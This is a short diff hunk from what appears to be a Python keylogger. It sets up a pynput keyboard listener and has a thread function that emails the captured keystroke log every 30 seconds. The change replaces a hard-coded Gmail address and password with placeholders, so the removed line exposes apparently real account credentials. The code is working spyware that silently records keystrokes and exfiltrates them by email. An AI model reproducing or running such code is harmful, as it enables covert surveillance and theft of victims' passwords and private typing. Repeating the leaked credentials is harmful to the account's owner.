@@ -43,7 +43,7 @@ keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 def thread_function():
     global log
     #printer()
-    send_email("keremerdem2022@gmail.com","!1802200818022008!",log.encode("utf-8"))
+    send_email("email","password",log.encode("utf-8"))
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
